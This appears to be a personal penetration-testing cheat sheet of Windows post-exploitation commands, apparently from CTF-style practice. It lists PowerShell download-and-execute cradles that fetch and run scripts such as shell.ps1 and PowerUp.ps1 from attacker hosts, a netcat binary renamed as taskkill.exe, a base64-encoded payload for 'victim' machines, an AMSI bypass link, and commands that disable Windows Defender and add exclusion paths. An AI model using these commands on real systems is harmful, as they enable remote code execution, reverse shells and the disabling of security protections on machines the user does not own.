https://lolbas-project.github.io/#


## Download File

```powershell
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
```

```powershell
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
```

## Reverse Shell

### Download and execute #reverseshell 
```powershell
powershell "IEX(New-Object Net.WebClient).downloadString('http://<IP>:<port>/ipw.ps1')"

echo IEX(New-Object Net.WebClient).DownloadString('http://<IP>:<port>/PowerUp.ps1') | powershell -noprofile - #From cmd download and execute

iex (iwr '<IP>:<port>/ipw.ps1') #From PSv3
```

### base64 copy paste from Linux #reverseshell 

```bash
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0 # Run on linux machine

powershell -nop -enc <BASE64_ENCODED_PAYLOAD> # Run on victim windows
```


## Windows Features #windows

#### PS Constrained Language Mode

Check
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

#### AMSI Bypass

https://amsi.fail/

#### Enable WinRM

```powershell
enable-psremoting -force #This enables winrm

# Change NetWorkConnection Category to Private
#Requires -RunasAdministrator

Get-NetConnectionProfile |
  Where{ $_.NetWorkCategory -ne 'Private'} |
  ForEach {
    $_
    $_|Set-NetConnectionProfile -NetWorkCategory Private -Confirm
  }
```

#### Disable Defender

```powershell
# Check status
Get-MpComputerStatus
Get-MpPreference | select Exclusion* | fl #Check exclusions
# Disable
Set-MpPreference -DisableRealtimeMonitoring $true
#To completely disable Windows Defender on a computer, use the command:
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
# Set exclusion path
Add-MpPreference -ExclusionPath "C:\users\public\documents\magichk"
Set-MpPreference -ExclusionPath "C:\users\public\documents\magichk"

# Check exclusions configured via GPO
Parse-PolFile .\Registry.pol

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions
ValueName : Exclusions_Paths
ValueType : REG_DWORD
ValueLength : 4
ValueData : 1

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths
ValueName : C:\Windows\Temp
ValueType : REG_SZ
ValueLength : 4
ValueData : 0
```



WinPeas needs .Net 4.0 to run properly

